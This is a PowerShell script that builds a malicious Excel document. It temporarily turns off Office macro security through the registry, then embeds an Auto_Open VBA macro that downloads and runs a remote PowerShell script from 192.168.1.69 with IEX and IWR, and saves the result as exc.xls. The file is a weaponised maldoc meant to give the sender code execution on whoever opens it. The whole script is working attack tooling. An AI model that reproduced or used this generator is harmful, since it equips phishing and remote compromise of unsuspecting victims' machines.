$global:defLoc = "D:\AvBuster\src\outfiles"
$global:Name = "exc.xls"
$global:FullName = "$global:defLoc\$global:Name"


function macrorevshell {

#create macro

$Code = @"
Sub Auto_Open()
    Call Shell("cmd.exe /c powershell.exe IEX ( IWR -uri 'http://192.168.1.69/getit.ps1')", 1)
End Sub
"@

#Create excel document
$Excel01 = New-Object -ComObject "Excel.Application"
$ExcelVersion = $Excel01.Version

#Disable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

$Excel01.DisplayAlerts = $false
$Excel01.DisplayAlerts = "wdAlertsNone"
$Excel01.Visible = $false
$Workbook01 = $Excel01.Workbooks.Add(1)
$Worksheet01 = $Workbook01.WorkSheets.Item(1)

$ExcelModule = $Workbook01.VBProject.VBComponents.Add(1)
$ExcelModule.CodeModule.AddFromString($Code)

#Save the document
Add-Type -AssemblyName Microsoft.Office.Interop.Excel
$Workbook01.SaveAs("$global:FullName", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
Write-Output "Saved to file $global:Fullname"

#Cleanup
$Excel01.Workbooks.Close()
$Excel01.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel01) | out-null
$Excel01 = $Null
if (ps excel){kill -name excel}

#Enable Macro Security
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null

}
macrorevshell